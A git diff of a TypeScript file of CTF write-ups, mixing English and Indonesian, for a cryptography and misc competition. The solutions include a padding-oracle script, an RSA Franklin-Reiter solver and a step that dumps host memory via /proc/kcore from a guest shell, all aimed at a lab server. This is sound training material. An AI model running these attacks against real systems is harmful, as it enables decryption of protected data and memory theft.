@@ -4,115 +4,16 @@ import type { WriteUp } from '../types';
 export const ramWriteups: WriteUp[] = [
   {
     "id": "ram-crypto-delhi",
-    "title": "Output processing logic omitted for brevity...",
+    "title": "CTF — Delphi Protocol 1",
     "category": "Crypto",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
     "description": "CTF Writeup — Delphi Protocol 1",
-    "problemDescription": `CTF Writeup — Delphi Protocol 1
-
-Event: RAM CTF
-Category: Cryptography
-Difficulty: Medium
-Flag: RMCTF{S0M3WH4T_S5331N6_0RAC13}
-
-Challenge Description
-
-We have managed to get you access to an API that queries the general channel of Ironclad.ai, an AI-powered cryptography startup rewriting cryptography libraries. Attached is the source code we managed to pull from a developer's abandoned laptop. See if you can decrypt their communications, and find out what they're working on.
-
-Target: 10.42.5.10:1337
-
-Reconnaissance
-
-Step 1 — Setup VPN Connection
-
-The challenge provides a WireGuard configuration file (ram.conf). The first step is to establish a connection to the internal network.
-
-\`\`\`bash
-sudo wg-quick up ./ram.conf
-\`\`\`
-
-Verify the connection:
-
-\`\`\`bash
-ping -c 4 10.42.5.10
-\`\`\`
-
-Step 2 — Inspect the Target Service
-
-Connecting to the target port using netcat reveals an internal log access portal.
-
-\`\`\`bash
-nc 10.42.5.10 1337
-\`\`\`
-
-Output:
-
-\`\`\`text
-Delphi Backend Portal - Internal Log Access
-
-Intercepted Transmission:
-  token : b99900dabcf8a858... (long hex string)
-  iv    : a52c6283ebe553b0a1962db103364147
-
-Commands:
-  DECRYPT iv_hex token_hex
-  QUIT
-\`\`\`
-
-The server provides a ciphertext (token), an Initialization Vector (iv), and a command to perform decryption. The name "Delphi" (referencing the Oracle of Delphi) strongly hints at a Padding Oracle Attack.
-
-Exploitation
-
-Step 3 — Confirm Padding Oracle Vulnerability
-
-To confirm the vulnerability, we need to test how the server handles invalid padding. We send the original IV and token, but modify the last byte of the token.
-
-\`\`\`bash
-$ DECRYPT a52c6283ebe553b0a1962db103364147 b99900dabcf8a858...7b7b
-\`\`\`
-
-Response:
-
-\`\`\`text
-ERROR: malformed token
-\`\`\`
-
-The server responds with a specific error message (ERROR: malformed token) when the PKCS#7 padding is invalid. If the padding is correct, this error does not appear. This behavior confirms the server acts as a padding oracle.
-
-Step 4 — Exploit via Automated Script
-
-Since the target uses AES-CBC, we can manipulate the ciphertext of the previous block ($C_{i-1}$) to alter the plaintext of the current block ($P_i$) during decryption. By brute-forcing the bytes from right to left and observing the server's response, we can deduce the plaintext byte by byte.
-
-We use a Python script with pwntools to automate this process.
-
-\`\`\`python
-from pwn import *
-
-HOST = '10.42.5.10'
-PORT = 1337
-IV_HEX = "a52c6283ebe553b0a1962db103364147"
-TOKEN_HEX = "b99900dabcf8a858230682b42866bcd54682f74bee28b0f58f5c943385bf55bdb6139dc85cb922bfb640bf21d6ef18b331c79b525e448a4dcd2500770cac740cb7bde0118b163ec4850832e315ed964add24c589dd12d368e007a253d28c7918b51d4f7352389cbd14c12ce77322cb63440116d40f0faca0f07a0942a06d90167ff020e5ea1d67d6d4e6d63284a71021a67f7b7be8ac1c5e5e93a1b4bdff3a7cb7bf61777a0e153af17132ff3d4d833fb90d109514e0ee5533f83c2604060e92818ba56a2691ce139c6d9ee554bdd04cc47f9f8d6ea19eda3bf606d7dea182cab2df99668f5d669a70c39b8f14a33d32b7ce0c8628e59f7ee245d1c27306e092ac4208787772d3e39c8c54506912ee8017f54cb35d9488f60a89c8b510b3ce5038c4e5ee0233dcbdd5bfe5874b84f27308832f78da5c6c40df5a09f1db5746c2d8cda59bed2969804b14822e0d9cb52730d2e683c834ab42ba7215d985cb68ec20079eabcc15f36d5b1a24f5d19b88817c0fcbc55675d9dad7be3fd3b802d3b5010937f42a4cbc0a23fa94a7f83e7b7a"
-
-r = remote(HOST, PORT)
-r.recvuntil(b'$ ')
-
-def oracle(iv_test, ct_test):
-    r.sendline(f"DECRYPT {iv_test.hex()} {ct_test.hex()}".encode())
-    return b"malformed token" not in r.recvuntil(b'$ ')
-\`\`\`
-
-Step 5 — Retrieve the Decrypted Text
-
-Running the script block by block eventually reconstructs the entire plaintext, revealing the flag hidden within the communications.
-
-Flag
-
-RMCTF{S0M3WH4T_S5331N6_0RAC13}`,
+    "problemDescription": "CTF Writeup — Delphi Protocol 1\n\nEvent: RAM CTF\nCategory: Cryptography\nDifficulty: Medium\nFlag: RMCTF{S0M3WH4T_S5331N6_0RAC13}\n\nChallenge Description\n\nWe have managed to get you access to an API that queries the general channel of Ironclad.ai, an AI-powered cryptography startup rewriting cryptography libraries. Attached is the source code we managed to pull from a developer's abandoned laptop. See if you can decrypt their communications, and find out what they're working on.\n\nTarget: 10.42.5.10:1337\n\nReconnaissance\n\nStep 1 — Setup VPN Connection\n\nThe challenge provides a WireGuard configuration file (ram.conf). The first step is to establish a connection to the internal network.\n\nsudo wg-quick up ./ram.conf\n\n\nVerify the connection:\n\nping -c 4 10.42.5.10\n\n\nStep 2 — Inspect the Target Service\n\nConnecting to the target port using netcat reveals an internal log access portal.\n\nnc 10.42.5.10 1337\n\n\nOutput:\n\nDelphi Backend Portal - Internal Log Access\n\nIntercepted Transmission:\n  token : b99900dabcf8a858... (long hex string)\n  iv    : a52c6283ebe553b0a1962db103364147\n\nCommands:\n  DECRYPT iv_hex token_hex\n  QUIT\n\n\nThe server provides a ciphertext (token), an Initialization Vector (iv), and a command to perform decryption. The name \"Delphi\" (referencing the Oracle of Delphi) strongly hints at a Padding Oracle Attack.\n\nExploitation\n\nStep 3 — Confirm Padding Oracle Vulnerability\n\nTo confirm the vulnerability, we need to test how the server handles invalid padding. We send the original IV and token, but modify the last byte of the token.\n\n$ DECRYPT a52c6283ebe553b0a1962db103364147 b99900dabcf8a858...7b7b\n\n\nResponse:\n\nERROR: malformed token\n\n\nThe server responds with a specific error message (ERROR: malformed token) when the PKCS#7 padding is invalid. If the padding is correct, this error does not appear. This behavior confirms the server acts as a padding oracle.\n\nStep 4 — Exploit via Automated Script\n\nSince the target uses AES-CBC, we can manipulate the ciphertext of the previous block ($C_{i-1}$) to alter the plaintext of the current block ($P_i$) during decryption. By brute-forcing the bytes from right to left and observing the server's response, we can deduce the plaintext byte by byte.\n\nWe use a Python script with pwntools to automate this process.\n\nfrom pwn import *\n\nHOST = '10.42.5.10'\nPORT = 1337\nIV_HEX = \"a52c6283ebe553b0a1962db103364147\"\nTOKEN_HEX = \"b99900dabcf8a858230682b42866bcd54682f74bee28b0f58f5c943385bf55bdb6139dc85cb922bfb640bf21d6ef18b331c79b525e448a4dcd2500770cac740cb7bde0118b163ec4850832e315ed964add24c589dd12d368e007a253d28c7918b51d4f7352389cbd14c12ce77322cb63440116d40f0faca0f07a0942a06d90167ff020e5ea1d67d6d4e6d63284a71021a67f7b7be8ac1c5e5e93a1b4bdff3a7cb7bf61777a0e153af17132ff3d4d833fb90d109514e0ee5533f83c2604060e92818ba56a2691ce139c6d9ee554bdd04cc47f9f8d6ea19eda3bf606d7dea182cab2df99668f5d669a70c39b8f14a33d32b7ce0c8628e59f7ee245d1c27306e092ac4208787772d3e39c8c54506912ee8017f54cb35d9488f60a89c8b510b3ce5038c4e5ee0233dcbdd5bfe5874b84f27308832f78da5c6c40df5a09f1db5746c2d8cda59bed2969804b14822e0d9cb52730d2e683c834ab42ba7215d985cb68ec20079eabcc15f36d5b1a24f5d19b88817c0fcbc55675d9dad7be3fd3b802d3b5010937f42a4cbc0a23fa94a7f83e7b7a\"\n\nr = remote(HOST, PORT)\nr.recvuntil(b'$ ')\n\ndef oracle(iv_test, ct_test):\n    r.sendline(f\"DECRYPT {iv_test.hex()} {ct_test.hex()}\".encode())\n    return b\"malformed token\" not in r.recvuntil(b'$ ')\n\n\n\nStep 5 — Retrieve the Decrypted Text\n\nRunning the script block by block eventually reconstructs the entire plaintext, revealing the flag hidden within the communications.\n\nFlag\n\nRMCTF{S0M3WH4T_S5331N6_0RAC13}",
     "tools": [],
     "analysis": "",
     "solution": [
@@ -128,163 +29,16 @@ RMCTF{S0M3WH4T_S5331N6_0RAC13}`,
   },
   {
     "id": "ram-crypto-eanasirsecure",
-    "title": "Data from output.txt",
+    "title": "CTF — Ea Nasir Secure",
     "category": "Crypto",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
     "description": "CTF Writeup — Ea Nasir Secure",
-    "problemDescription": `CTF Writeup — Ea Nasir Secure
-
-Event: RAM CTF
-Category: Cryptography
-Difficulty: Medium
-Flag: RMCTF{C0PP3r_vs_S733L}
-
-Challenge Description
-
-gibson has taught the employees at steelsecure to use RSA to secure their work, but we don't trust it entirely. Enclosed is the source for their encryption, and an output.txt we salvaged from an abandoned laptop.
-
-Reconnaissance
-
-We are provided with two files: chall.py (the encryption script) and output.txt (the resulting encrypted data).
-
-Step 1 — Analyze the Encryption Script (chall.py)
-Looking at the source code, we can see a standard RSA setup but with a twist on how the message is encrypted:
-
-\`\`\`python
-def generate_params():
-    e = 3
-    p = getPrime(512)
-    q = getPrime(512)
-    n = p * q
-    return n, e
-
-def main():
-    n, e = generate_params()
-    m = bytes_to_long(FLAG)
-
-    a = random.randint(2, 100)
-    b = random.randint(1, 2**32)
-    c = random.randint(2, 100)
-    d = random.randint(1, 2**32)
-
-    m1 = (a * m + b) % n
-    m2 = (c * m + d) % n
-
-    c1 = pow(m1, e, n)
-    c2 = pow(m2, e, n)
-    # ... prints outputs ...
-\`\`\`
-
-Key observations:
-
-Small Public Exponent: The exponent used is $e = 3$.
-
-Related Messages: The exact same message $m$ (the flag) is used to create two different plaintexts, $m_1$ and $m_2$, using a linear relationship:
-
-$m_1 = a \\cdot m + b \\pmod n$
-
-$m_2 = c \\cdot m + d \\pmod n$
-
-These related plaintexts are then encrypted to produce $c_1$ and $c_2$.
-
-Step 2 — Review the Output (output.txt)
-The output.txt file provides us with all the necessary public information to launch an attack:
-
-The modulus $n$
-
-The exponent $e = 3$
-
-The two ciphertexts $c_1$ and $c_2$
-
-The exact values of the linear coefficients:
-
-$a = 70$, $b = 2706420314$
-
-$c = 3$, $d = 2929618574$
-
-Exploitation
-
-Step 3 — Identify the Vulnerability
-This is a textbook scenario for the Franklin-Reiter Related Message Attack. When two related messages (where the relationship is a known linear function) are encrypted using RSA with the same modulus $n$ and the same small exponent $e$ (typically $e=3$), it is possible to recover the original message $m$.
-
-Mathematically, we know that:
-
-$c_1 \\equiv (a \\cdot m + b)^e \\pmod n$
-
-$c_2 \\equiv (c \\cdot m + d)^e \\pmod n$
-
-We can define two polynomials in the ring $\\mathbb{Z}_n[x]$:
-
-$f_1(x) = (a \\cdot x + b)^e - c_1$
-
-$f_2(x) = (c \\cdot x + d)^e - c_2$
-
-Since $m$ is a root for both equations, the binomial $(x - m)$ must be a common factor of both polynomials. By calculating the Greatest Common Divisor (GCD) of $f_1$ and $f_2$, we will be left with the linear polynomial $(x - m)$, allowing us to extract $m$.
-
-Step 4 — Develop the Solver Script
-To calculate the GCD of polynomials over a modulo ring efficiently, we use SageMath.
-
-\`\`\`python
-from Crypto.Util.number import long_to_bytes
-
-n = 98237543086838092972727647602649684412823690703586018468107564793518052420849467378972960087089904634059300894743876081610848224988135902506827923518956599452500642947331481355296570045228580344605876571313298325475476590965722009164468025644000368474389606511878244554300783192096414689616993763058583937333
-e = 3
-c1 = 10014749067983552801777308442259360701131069253434425322498731759314630313146300050356987559850355269257216025931575623364251535349426572721190934970466052609892864
-c2 = 788333017013282582064102996912544428368918059912083172803001714562442559798914489707221771582656784173467830862787901677858526810864572559845148224601602432125
-a, b = 70, 2706420314
-c, d = 3, 2929618574
-
-P.<x> = PolynomialRing(Zmod(n))
-
-f1 = (a*x + b)^e - c1
-f2 = (c*x + d)^e - c2
-
-def gcd(g1, g2):
-    while g2:
-        g1, g2 = g2, g1 % g2
-    return g1.monic()
-
-result = gcd(f1, f2)
-
-m = -result.coefficients()[0]
-
-print(long_to_bytes(int(m)).decode())
-\`\`\`
-
-Step 5 — Execution
-Running the SageMath script recovers the integer $m$, which when converted back to bytes yields the flag.
-
-Flag
-
-RMCTF{C0PP3r_vs_S733L}
-
-Vulnerability Summary
-
-Franklin-Reiter Related Message Attack (Small Public Exponent $e=3$)
-
-Remediation
-
-Use Proper Padding: Always use standardized padding schemes like OAEP (Optimal Asymmetric Encryption Padding) when using RSA. Padding introduces randomness into the plaintext before encryption, completely destroying the linear relationship required for this attack.
-
-Increase Public Exponent: While padding is the primary defense, using a larger public exponent (commonly $e = 65537$) prevents a wider class of algebraic attacks (like Coppersmith's attack) that exploit small exponents.
-
-Tools Used
-
-SageMath — Used for its advanced algebraic capabilities, specifically defining polynomial rings over $\\mathbb{Z}_n$ and computing their GCD.
-
-Attack Flow
-
-1. Analyze chall.py & output.txt
-2. Identify RSA with e=3 and linearly related messages (m1, m2)
-3. Construct polynomials: f1(x) = (ax+b)³ - c1, f2(x) = (cx+d)³ - c2
-4. Use SageMath to compute the polynomial GCD of f1 and f2 over Z_n
-5. Extract the root of the resulting linear binomial (x - m)
-6. Convert integer m to bytes → RMCTF{C0PP3r_vs_S733L}`,
+    "problemDescription": "CTF Writeup — Ea Nasir Secure\n\nEvent: (Nama Event CTF, misal: RAM CTF)\nCategory: Cryptography\nDifficulty: Medium\nFlag: RMCTF{C0PP3r_vs_S733L}\n\nChallenge Description\n\ngibson has taught the employees at steelsecure to use RSA to secure their work, but we don't trust it entirely. Enclosed is the source for their encryption, and an output.txt we salvaged from an abandoned laptop.\n\nReconnaissance\n\nWe are provided with two files: chall.py (the encryption script) and output.txt (the resulting encrypted data).\n\nStep 1 — Analyze the Encryption Script (chall.py)\nLooking at the source code, we can see a standard RSA setup but with a twist on how the message is encrypted:\n\ndef generate_params():\n    e = 3\n    p = getPrime(512)\n    q = getPrime(512)\n    n = p * q\n    return n, e\n\ndef main():\n    n, e = generate_params()\n    m = bytes_to_long(FLAG)\n\n    a = random.randint(2, 100)\n    b = random.randint(1, 2**32)\n    c = random.randint(2, 100)\n    d = random.randint(1, 2**32)\n\n    m1 = (a * m + b) % n\n    m2 = (c * m + d) % n\n\n    c1 = pow(m1, e, n)\n    c2 = pow(m2, e, n)\n    # ... prints outputs ...\n\n\nKey observations:\n\nSmall Public Exponent: The exponent used is $e = 3$.\n\nRelated Messages: The exact same message $m$ (the flag) is used to create two different plaintexts, $m_1$ and $m_2$, using a linear relationship:\n\n$m_1 = a \\cdot m + b \\pmod n$\n\n$m_2 = c \\cdot m + d \\pmod n$\n\nThese related plaintexts are then encrypted to produce $c_1$ and $c_2$.\n\nStep 2 — Review the Output (output.txt)\nThe output.txt file provides us with all the necessary public information to launch an attack:\n\nThe modulus $n$\n\nThe exponent $e = 3$\n\nThe two ciphertexts $c_1$ and $c_2$\n\nThe exact values of the linear coefficients:\n\n$a = 70$, $b = 2706420314$\n\n$c = 3$, $d = 2929618574$\n\nExploitation\n\nStep 3 — Identify the Vulnerability\nThis is a textbook scenario for the Franklin-Reiter Related Message Attack. When two related messages (where the relationship is a known linear function) are encrypted using RSA with the same modulus $n$ and the same small exponent $e$ (typically $e=3$), it is possible to recover the original message $m$.\n\nMathematically, we know that:\n\n$c_1 \\equiv (a \\cdot m + b)^e \\pmod n$\n\n$c_2 \\equiv (c \\cdot m + d)^e \\pmod n$\n\nWe can define two polynomials in the ring $\\mathbb{Z}_n[x]$:\n\n$f_1(x) = (a \\cdot x + b)^e - c_1$\n\n$f_2(x) = (c \\cdot x + d)^e - c_2$\n\nSince $m$ is a root for both equations, the binomial $(x - m)$ must be a common factor of both polynomials. By calculating the Greatest Common Divisor (GCD) of $f_1$ and $f_2$, we will be left with the linear polynomial $(x - m)$, allowing us to extract $m$.\n\nStep 4 — Develop the Solver Script\nTo calculate the GCD of polynomials over a modulo ring efficiently, we use SageMath.\n\nfrom Crypto.Util.number import long_to_bytes\n\nn = 98237543086838092972727647602649684412823690703586018468107564793518052420849467378972960087089904634059300894743876081610848224988135902506827923518956599452500642947331481355296570045228580344605876571313298325475476590965722009164468025644000368474389606511878244554300783192096414689616993763058583937333\ne = 3\nc1 = 10014749067983552801777308442259360701131069253434425322498731759314630313146300050356987559850355269257216025931575623364251535349426572721190934970466052609892864\nc2 = 788333017013282582064102996912544428368918059912083172803001714562442559798914489707221771582656784173467830862787901677858526810864572559845148224601602432125\na, b = 70, 2706420314\nc, d = 3, 2929618574\n\nP.<x> = PolynomialRing(Zmod(n))\n\nf1 = (a*x + b)^e - c1\nf2 = (c*x + d)^e - c2\n\ndef gcd(g1, g2):\n    while g2:\n        g1, g2 = g2, g1 % g2\n    return g1.monic()\n\nresult = gcd(f1, f2)\n\nm = -result.coefficients()[0]\n\nprint(long_to_bytes(int(m)).decode())\n\n\nStep 5 — Execution\nRunning the SageMath script recovers the integer $m$, which when converted back to bytes yields the flag.\n\nFlag\n\nRMCTF{C0PP3r_vs_S733L}\n\nVulnerability Summary\n\n#\n\nVulnerability Detail\n\n1\n\nFranklin-Reiter Related Message Attack\n\n2\n\nSmall Public Exponent ($e=3$)\n\nRemediation\n\nUse Proper Padding: Always use standardized padding schemes like OAEP (Optimal Asymmetric Encryption Padding) when using RSA. Padding introduces randomness into the plaintext before encryption, completely destroying the linear relationship required for this attack.\n\nIncrease Public Exponent: While padding is the primary defense, using a larger public exponent (commonly $e = 65537$) prevents a wider class of algebraic attacks (like Coppersmith's attack) that exploit small exponents.\n\nTools Used\n\nSageMath — Used for its advanced algebraic capabilities, specifically defining polynomial rings over $\\mathbb{Z}_n$ and computing their GCD.\n\nAttack Flow\n\nAnalyze chall.py & output.txt\n      │\n      ▼\nIdentify RSA with e=3 and linearly related messages (m1, m2)\n      │\n      ▼\nConstruct polynomials: f1(x) = (ax+b)³ - c1, f2(x) = (cx+d)³ - c2\n      │\n      ▼\nUse SageMath to compute the polynomial GCD of f1 and f2 over Z_n\n      │\n      ▼\nExtract the root of the resulting linear binomial (x - m)\n      │\n      ▼\nConvert integer m to bytes → RMCTF{C0PP3r_vs_S733L}",
     "tools": [],
     "analysis": "",
     "solution": [
@@ -300,11 +54,11 @@ Attack Flow
   },
   {
     "id": "ram-crypto-gibson2026",
-    "title": "secp256k1 curve order",
+    "title": "gibson vs 2006",
     "category": "Crypto",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -325,109 +79,16 @@ Attack Flow
   },
   {
     "id": "ram-crypto-nine",
-    "title": "Mengambil salah satu sampel dari output.txt",
+    "title": "CTF — Nine Strings, Nine Bytes, Nine Nines?",
     "category": "Crypto",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
     "description": "CTF Writeup — Nine Strings, Nine Bytes, Nine Nines?",
-    "problemDescription": `CTF Writeup — Nine Strings, Nine Bytes, Nine Nines?
-
-Event: RAM CTF
-Category: Crypto
-Difficulty: Easy
-Flag: RAM{M0rPH063N371C_F131D}
-
-Challenge Description
-
-steelsecure.ai have switched to a new url-safe data transmission method that we don't understand. As always, our insider has access to the api they use to create these url-safe strings, but we are no closer to working out how they work.
-
-Target File: output.txt
-
-Connection: nc 10.42.5.10 9999
-
-Reconnaissance
-
-Step 1 — Analyze Output File
-
-File output.txt berisi tiga baris data dengan format [integer]:[string_angka_panjang].
-
-\`\`\`text
-75:001452364189...
-33:008254923251...
-24:002055539561...
-\`\`\`
-
-Angka di depan titik dua sepertinya menunjukkan panjang byte dari pesan asli, sedangkan string angka adalah data yang terenkripsi/terkode.
-
-Step 2 — Interact with the Server
-
-Menghubungkan ke server menggunakan netcat memberikan informasi krusial di banner:
-
-\`\`\`text
-==============================================
-State of the art encoding by steelsecure.ai
-Commands:
-  encode <text>   — encode a string
-  decode <text>   — decode a base-999 string (UNDER MAINT!)
-==============================================
-\`\`\`
-
-Banner tersebut secara eksplisit menyebutkan "Base-999 string". Judul tantangan "Nine Strings, Nine Bytes, Nine Nines?" juga mengonfirmasi penggunaan angka 9.
-
-Exploitation
-
-Step 3 — Pattern Analysis
-
-Dalam Base-999, setiap "digit" dari sistem bilangan tersebut bernilai maksimal 998. Karena $999$ mendekati $1000$ ($10^3$), maka cara paling masuk akal untuk merepresentasikan satu digit Base-999 dalam string desimal adalah dengan menggunakan 3 digit angka (000 hingga 998).
-
-Contoh: String 008254...
-
-Digit ke-1: 008 (Nilai: 8)
-
-Digit ke-2: 254 (Nilai: 254)
-
-Step 4 — Mathematical Decoding
-
-Untuk mengembalikan data ke bentuk aslinya, kita harus:
-
-Memecah string menjadi blok sepanjang 3 karakter.
-
-Menghitung nilai total desimal (Big Integer) menggunakan rumus:
-
-$$V = \\sum_{i=0}^{n-1} d_i \\cdot 999^{(n-1-i)}$$
-
-Mengonversi integer $V$ tersebut kembali menjadi bytes sesuai dengan panjang yang diberikan di awal.
-
-Step 5 — Automated Script
-
-Menggunakan Python untuk melakukan konversi otomatis pada data di output.txt:
-
-\`\`\`python
-def solve_base999(encoded_data, byte_len):
-    # Pecah per 3 digit
-    chunks = [int(encoded_data[i:i+3]) for i in range(0, len(encoded_data), 3)]
-    
-    # Konversi Base-999 ke Integer
-    val = 0
-    for c in chunks:
-        val = val * 999 + c
-        
-    # Konversi Integer ke Bytes
-    return val.to_bytes(byte_len, 'big').decode()
-
-payload = "001452364189848287923821742568954303648698985244216888407919381357574656595589327310217711904601016561079226903056403550476359808600659903252340182702873643487914166139407119810527154"
-print(solve_base999(payload, 75))
-\`\`\`
-
-Menjalankan script tersebut pada baris pertama menghasilkan flag yang dicari.
-
-Flag
-
-RAM{M0rPH063N371C_F131D}`,
+    "problemDescription": "CTF Writeup — Nine Strings, Nine Bytes, Nine Nines?\n\nEvent: RAM CTF\n\nCategory: Crypto\n\nDifficulty: Easy\n\nFlag: RAM{M0rPH063N371C_F131D}\n\nChallenge Description\n\nsteelsecure.ai have switched to a new url-safe data transmission method that we don't understand. As always, our insider has access to the api they use to create these url-safe strings, but we are no closer to working out how they work.\n\nTarget File: output.txt\n\nConnection: nc 10.42.5.10 9999\n\nReconnaissance\n\nStep 1 — Analyze Output File\n\nFile output.txt berisi tiga baris data dengan format [integer]:[string_angka_panjang].\n\n75:001452364189...\n33:008254923251...\n24:002055539561...\n\n\nAngka di depan titik dua sepertinya menunjukkan panjang byte dari pesan asli, sedangkan string angka adalah data yang terenkripsi/terkode.\n\nStep 2 — Interact with the Server\n\nMenghubungkan ke server menggunakan netcat memberikan informasi krusial di banner:\n\n==============================================\nState of the art encoding by steelsecure.ai\nCommands:\n  encode <text>   — encode a string\n  decode <text>   — decode a base-999 string (UNDER MAINT!)\n==============================================\n\n\nBanner tersebut secara eksplisit menyebutkan \"Base-999 string\". Judul tantangan \"Nine Strings, Nine Bytes, Nine Nines?\" juga mengonfirmasi penggunaan angka 9.\n\nExploitation\n\nStep 3 — Pattern Analysis\n\nDalam Base-999, setiap \"digit\" dari sistem bilangan tersebut bernilai maksimal 998. Karena $999$ mendekati $1000$ ($10^3$), maka cara paling masuk akal untuk merepresentasikan satu digit Base-999 dalam string desimal adalah dengan menggunakan 3 digit angka (000 hingga 998).\n\nContoh: String 008254...\n\nDigit ke-1: 008 (Nilai: 8)\n\nDigit ke-2: 254 (Nilai: 254)\n\nStep 4 — Mathematical Decoding\n\nUntuk mengembalikan data ke bentuk aslinya, kita harus:\n\nMemecah string menjadi blok sepanjang 3 karakter.\n\nMenghitung nilai total desimal (Big Integer) menggunakan rumus:\n\n\n$$V = \\sum_{i=0}^{n-1} d_i \\cdot 999^{(n-1-i)}$$\n\nMengonversi integer $V$ tersebut kembali menjadi bytes sesuai dengan panjang yang diberikan di awal.\n\nStep 5 — Automated Script\n\nMenggunakan Python untuk melakukan konversi otomatis pada data di output.txt:\n\ndef solve_base999(encoded_data, byte_len):\n    # Pecah per 3 digit\n    chunks = [int(encoded_data[i:i+3]) for i in range(0, len(encoded_data), 3)]\n    \n    # Konversi Base-999 ke Integer\n    val = 0\n    for c in chunks:\n        val = val * 999 + c\n        \n    # Konversi Integer ke Bytes\n    return val.to_bytes(byte_len, 'big').decode()\n\npayload = \"001452364189848287923821742568954303648698985244216888407919381357574656595589327310217711904601016561079226903056403550476359808600659903252340182702873643487914166139407119810527154\"\nprint(solve_base999(payload, 75))\n\n\nMenjalankan script tersebut pada baris pertama menghasilkan flag yang dicari.\n\nFlag\n\nRAM{M0rPH063N371C_F131D}",
     "tools": [],
     "analysis": "",
     "solution": [
@@ -447,7 +108,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Crypto",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -517,7 +178,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Misc",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -526,6 +187,11 @@ RAM{M0rPH063N371C_F131D}`,
     "tools": [],
     "analysis": "",
     "solution": [
+      {
+        "title": "Langkah solve",
+        "content": "Jalankan:\n\n\n\nScript akan:\n\n1. connect ke service\n2. tunggu shell guest\n3. baca header `/proc/kcore`\n4. cari `LOAD` segment target\n5. dump chunk 4MB pada offset relatif `0x1800000`\n6. regex flag dari chunk tersebut",
+        "code": "python3 solve.py"
+      },
       {
         "title": "Solver Script",
         "content": "The complete exploit/solver script (solve.py) is provided below:",
@@ -542,7 +208,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Misc",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -572,7 +238,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Misc",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -601,7 +267,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Misc",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -637,6 +303,11 @@ RAM{M0rPH063N371C_F131D}`,
         "content": "- `solve.py`: solver otomatis end-to-end untuk challenge ini."
       },
       {
+        "title": "Cara Menjalankan",
+        "content": "Atau jika host/port berubah:",
+        "code": "python3 solve.py"
+      },
+      {
         "title": "Solver Script",
         "content": "The complete exploit/solver script (solve.py) is provided below:",
         "code": "#!/usr/bin/env python3\r\nimport re\r\nimport socket\r\nimport sys\r\nimport time\r\nfrom collections import deque\r\n\r\n\r\nHOST = sys.argv[1] if len(sys.argv) > 1 else \"10.42.5.10\"\r\nPORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9998\r\n\r\nANSI_RE = re.compile(r\"\\x1b\\[[0-9;]*[A-Za-z]\")\r\nFRAME_RE = re.compile(\r\n    r\"--- Level (\\d+)/(\\d+) \\| Time Left: (\\d+)s ---\\n((?:[ #XE]+\\n){21})Move\\(s\\): \",\r\n    re.S,\r\n)\r\nFLAG_RE = re.compile(r\"(?:RAM|RMCTF)\\{[^}\\n]+\\}\")\r\n\r\n\r\ndef strip_ansi(text: str) -> str:\r\n    return ANSI_RE.sub(\"\", text)\r\n\r\n\r\ndef recv_until(sock: socket.socket, want: tuple[str, ...], timeout: float = 10.0) -> str:\r\n    buf = \"\"\r\n    end = time.time() + timeout\r\n    while time.time() < end:\r\n        clean = strip_ansi(buf)\r\n        if any(token in clean for token in want):\r\n            return clean\r\n        try:\r\n            chunk = sock.recv(16384)\r\n        except socket.timeout:\r\n            continue\r\n        if not chunk:\r\n            return clean\r\n        buf += chunk.decode(\"utf-8\", \"replace\")\r\n    raise TimeoutError(f\"timed out waiting for one of: {want}\")\r\n\r\n\r\ndef bfs(grid: list[str]) -> str:\r\n    start = None\r\n    end = None\r\n    for y, row in enumerate(grid):\r\n        for x, cell in enumerate(row):\r\n            if cell == \"X\":\r\n                start = (x, y)\r\n            elif cell == \"E\":\r\n                end = (x, y)\r\n    if start is None or end is None:\r\n        raise ValueError(\"grid missing X or E\")\r\n\r\n    q = deque([start])\r\n    prev: dict[tuple[int, int], tuple[tuple[int, int] | None, str | None]] = {\r\n        start: (None, None)\r\n    }\r\n    moves = [(\"W\", (0, -1)), (\"A\", (-1, 0)), (\"S\", (0, 1)), (\"D\", (1, 0))]\r\n    height = len(grid)\r\n    width = len(grid[0])\r\n\r\n    while q:\r\n        x, y = q.popleft()\r\n        if (x, y) == end:\r\n            break\r\n        for step, (dx, dy) in moves:\r\n            nx, ny = x + dx, y + dy\r\n            if not (0 <= nx < width and 0 <= ny < height):\r\n                continue\r\n            if grid[ny][nx] == \"#\" or (nx, ny) in prev:\r\n                continue\r\n            prev[(nx, ny)] = ((x, y), step)\r\n            q.append((nx, ny))\r\n\r\n    if end not in prev:\r\n        raise RuntimeError(\"no path to exit\")\r\n\r\n    path: list[str] = []\r\n    cur = end\r\n    while prev[cur][0] is not None:\r\n        parent, step = prev[cur]\r\n        path.append(step)  # type: ignore[arg-type]\r\n        cur = parent  # type: ignore[assignment]\r\n    path.reverse()\r\n    return \"\".join(path)\r\n\r\n\r\ndef parse_frame(text: str) -> tuple[int, int, int, list[str]]:\r\n    matches = list(FRAME_RE.finditer(text))\r\n    if not matches:\r\n        raise RuntimeError(\"no complete frame 